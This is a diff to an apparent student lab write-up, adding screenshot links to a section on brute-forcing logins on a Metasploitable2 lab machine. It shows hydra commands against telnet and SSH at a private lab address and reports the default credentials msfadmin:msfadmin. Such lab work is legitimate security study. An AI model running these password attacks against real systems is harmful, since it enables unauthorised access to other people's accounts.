@@ -83,6 +83,7 @@ Result: Successful login found – msfadmin:msfadmin
     - Command Used:
        
         hydra -l msfadmin -P passwords.txt telnet://192.168.154.133
+![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20124126.png?raw=true)
 
 Result: Successful login – msfadmin:msfadmin
 
@@ -93,6 +94,7 @@ Result: Successful login – msfadmin:msfadmin
     - Command Used:
         
         hydra -L usernames.txt -P passwords.txt ssh://192.168.154.133
+![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20125923.png?raw=true)
 
 Problem: Hydra (or the SSH client it's using) doesn't support the older key exchange algorithms used by the Meta2 machine, which is very outdated
 
